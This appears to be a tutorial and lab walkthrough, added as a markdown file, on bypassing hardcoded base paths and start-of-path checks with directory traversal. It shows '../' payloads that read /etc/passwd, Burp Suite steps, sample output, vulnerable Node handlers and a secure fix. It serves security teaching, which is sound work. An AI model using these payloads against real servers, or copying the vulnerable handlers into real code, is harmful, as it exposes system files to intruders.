@@ -1,0 +1,252 @@
+# Directory Traversal: Bypassing Hardcoded Base Paths (Start-of-Path Validation)
+
+In backend web architectures, a prevalent strategy to restrict user access to a specific folder is by **hardcoding a static base directory** or **enforcing start-of-path validation** (such as requiring parameters to start with `/var/www/images/` or `C:\inetpub\wwwroot\uploads\`).
+
+Developers assume that because file operations are constrained to an intended root directory, users cannot escape to view other files on the server. However, because operating systems natively process dot-dot-slash (`../`) navigation, hardcoded base path restrictions can be systematically bypassed.
+
+---
+
+## 1. Vulnerability Concept: Why Do Hardcoded Base Paths Fail?
+
+Consider how backend web applications routinely assemble file paths:
+
+```javascript
+// Backend hardcodes the base storage path
+const BASE_PATH = "/var/www/images/";
+const filename = req.query.filename;
+
+// Concatenating base path with user input
+const targetPath = BASE_PATH + filename;
+fs.readFile(targetPath, (err, data) => { ... });
+```
+
+### The Flaw in Developer Assumptions
+Operating systems (Linux, Unix, Windows) inherently support hierarchical directory navigation:
+- `.` represents the current working directory.
+- `..` represents **the parent directory (one level up)**.
+
+When the server concatenates `/var/www/images/` with `../../../etc/passwd`:
+```text
+/var/www/images/../../../etc/passwd
+```
+The OS kernel resolves the path backwards:
+1. From `/var/www/images/`, steps up to `/var/www/`
+2. From `/var/www/`, steps up to `/var/`
+3. From `/var/`, steps up to `/` (Root directory of the filesystem)
+4. Enters `/etc/passwd`!
+
+> [!TIP]
+> **Kernel Safety Principle:** On Linux and Unix systems, executing `../` while already located at the root directory (`/`) does not generate an error—the pointer remains at `/`. Consequently, attackers can supply excessive `../` sequences (e.g. 8 to 15 times) to ensure the root directory is reached regardless of base folder depth.
+
+---
+
+## 2. Exploitation Flow: Bypassing Hardcoded Base Paths
+
+![Directory Traversal Hardcoded Base Path Bypass](/images/directory-traversal-hardcoded-path.svg)
+
+---
+
+## 3. Two Primary Scenarios & Bypass Techniques
+
+Here are the primary scenarios involving hardcoded base paths and how to circumvent them:
+
+---
+
+### Scenario A: Simple Path Concatenation (Directory Depth Climbing)
+
+In this scenario, the developer appends user input directly to a hardcoded base folder:
+
+```javascript
+const targetFile = "/var/www/html/app/public/media/" + req.query.file;
+```
+
+#### Exploitation Strategy:
+1. Calculate the folder depth from the filesystem root (`/`):
+   - `var` (1) → `www` (2) → `html` (3) → `app` (4) → `public` (5) → `media` (6) = **Depth Level 6**.
+2. Supply a payload containing at least 6 `../` sequences:
+   ```http
+   GET /media?file=../../../../../../etc/passwd HTTP/1.1
+   ```
+3. The operating system kernel normalizes the path directly to `/etc/passwd`.
+
+---
+
+### Scenario B: Start-of-Path Validation (Prefix Enforcement)
+
+In more defensive configurations, developers enforce that the input parameter **must start with** an authorized directory prefix:
+
+```javascript
+// ❌ VULNERABLE: Verifying prefix on raw client input
+if (!req.query.filename.startsWith("/var/www/images/")) {
+  return res.status(403).json({ error: "Access denied: Path must start with /var/www/images/" });
+}
+
+// Directly opening the unnormalized path
+fs.readFile(req.query.filename, (err, data) => { ... });
+```
+
+#### Exploitation Strategy (Prefix Match & Jump):
+Begin the parameter value with the enforced directory prefix, followed immediately by `../` traversal sequences:
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+Host: target-website.com
+```
+
+#### Why This Works:
+1. The `startsWith("/var/www/images/")` condition evaluates to **`true` (Passes validation)**.
+2. When passed to the filesystem API, the OS kernel resolves `/var/www/images/../../../etc/passwd` directly to `/etc/passwd`.
+3. The prefix restriction is cleanly bypassed!
+
+---
+
+### Scenario C: Path Resolution Quirks (`path.resolve` / `os.path.join`)
+
+When backend applications use standard path resolution libraries:
+
+```javascript
+const finalPath = path.resolve("/var/www/images", req.query.filename);
+```
+
+If an attacker supplies an input starting with a leading slash `/` (such as `/etc/passwd`), `path.resolve` treats it as a new root, **discards the hardcoded `/var/www/images` prefix completely**, and resolves directly to `/etc/passwd`.
+
+---
+
+## 4. Step-by-Step Practical Exploitation with Burp Suite
+
+Follow this guide to solve the PortSwigger lab scenario (*File path traversal, validation of start of path*):
+
+---
+
+### Step 1: Intercept Product Image Request
+1. Open the embedded **Burp Suite** browser and visit the online store.
+2. Click any product and identify the image request in **Proxy** > **HTTP history**:
+   ```http
+   GET /image?filename=/var/www/images/50.jpg HTTP/1.1
+   Host: target-lab.net
+   ```
+3. Observe that the default request includes the full base directory prefix: `/var/www/images/50.jpg`.
+
+---
+
+### Step 2: Send Request to Burp Repeater
+1. Right-click the request and choose **Send to Repeater** (`Ctrl + R` / `Cmd + R`).
+2. Switch to the **Repeater** tab.
+
+---
+
+### Step 3: Test Standard Traversal (Observe Validation Error)
+1. Modify the parameter to standard traversal without the prefix:
+   ```http
+   GET /image?filename=../../../etc/passwd HTTP/1.1
+   ```
+2. Click **Send**.
+3. The server replies with an error (e.g. `400 Bad Request: "Missing parameter / path must start with /var/www/images/"`), confirming start-of-path enforcement.
+
+---
+
+### Step 4: Apply Prefix Fulfillment Payload
+1. Append `../../../etc/passwd` directly after the enforced `/var/www/images/` prefix:
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+Host: target-lab.net
+Cookie: session=xyz...
+```
+
+2. Click **Send**.
+
+---
+
+### Step 5: Analyze the Response
+1. Examine the **Response** panel on the right.
+2. The server responds with status **`200 OK`** and returns the contents of `/etc/passwd`:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Content-Length: 1345
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+carlos:x:1001:1001:Carlos:/home/carlos:/bin/bash
+peter:x:1002:1002:Peter:/home/peter:/bin/bash
+```
+
+3. The lab challenge is solved successfully (*Solved*)! 🎉
+
+---
+
+## 5. Backend Source Code: Vulnerable vs. Secure
+
+### ❌ Vulnerable Implementation (Raw Prefix Verification)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const filePath = req.query.filename as string;
+
+  // ❌ FLAW: Validating raw input string before path normalization
+  if (!filePath.startsWith("/var/www/images/")) {
+    return res.status(400).send("Path must start with /var/www/images/");
+  }
+
+  // ❌ Directly reading unnormalized path (../ triggers traversal)
+  fs.readFile(filePath, (err, data) => {
+    if (err) return res.status(404).send("File not found.");
+    return res.send(data);
+  });
+});
+```
+
+---
+
+### ✅ Secure Implementation (Canonical Containment Verification)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const BASE_DIR = path.resolve("/var/www/images");
+  const filename = req.query.filename as string;
+
+  if (!filename || typeof filename !== "string") {
+    return res.status(400).json({ error: "Invalid parameter." });
+  }
+
+  // 1. Whitelist Verification (Reject slashes and double dots)
+  if (!/^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|gif|webp)$/.test(path.basename(filename))) {
+    return res.status(400).json({ error: "Illegal filename format." });
+  }
+
+  // 2. Canonical Path Resolution: Normalize path with base directory
+  const targetPath = path.resolve(BASE_DIR, filename);
+
+  // 3. ✅ SECURE VALIDATION: Verify CANONICAL path remains inside BASE_DIR
+  if (!targetPath.startsWith(BASE_DIR + path.sep)) {
+    return res.status(403).json({ error: "Access outside working directory forbidden!" });
+  }
+
+  // 4. Verify file existence before serving
+  if (!fs.existsSync(targetPath)) {
+    return res.status(404).json({ error: "File not found." });
+  }
+
+  return res.sendFile(targetPath);
+});
+```
+
+---
+
+## 6. Mitigation Summary & Best Practices
+
+1. **Perform Validation ONLY AFTER Canonicalization:**
+   Never evaluate `startsWith()` on raw user strings. Always call `path.resolve()` or `realpath()` first, then verify that the canonical path starts with `BASE_DIR + path.sep`.
+2. **Utilize `path.basename()`:**
+   When an endpoint only expects a file name inside a designated folder, strip all directory prefixes with `path.basename(input)`.
+3. **Isolate Files via Database Lookups:**
+   Store media files referenced by randomized UUID keys in database tables rather than exposing filesystem path structures directly to the user.
